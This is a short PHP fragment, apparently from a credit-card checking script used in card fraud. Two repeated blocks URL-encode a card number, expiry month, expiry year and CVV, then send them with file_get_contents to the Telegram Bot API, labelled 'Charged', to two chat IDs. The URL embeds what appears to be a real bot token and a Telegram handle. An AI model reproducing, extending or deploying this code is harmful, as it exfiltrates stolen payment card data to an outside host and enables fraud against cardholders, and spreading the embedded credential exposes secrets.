...
$chargedcc = urlencode("
$cc|$mes|$ano|$cvv");
file_get_contents("https://api.telegram.org/bot5595238721:AAFI4icpN1pFw_QB0TBUQOkmFbG9O1tRy7Y/sendMessage?chat_id=5223680600&text=$1 Charged ✅<code>$chargedcc</code> %0A @ParvezOnFire2&parse_mode=HTML");

$chargedcc = urlencode("
$cc|$mes|$ano|$cvv");
file_get_contents("https://api.telegram.org/bot5595238721:AAFI4icpN1pFw_QB0TBUQOkmFbG9O1tRy7Y/sendMessage?chat_id=1001305532031&text=$1 Charged ✅<code>$chargedcc</code> %0A @ParvezOnFire2&parse_mode=HTML");
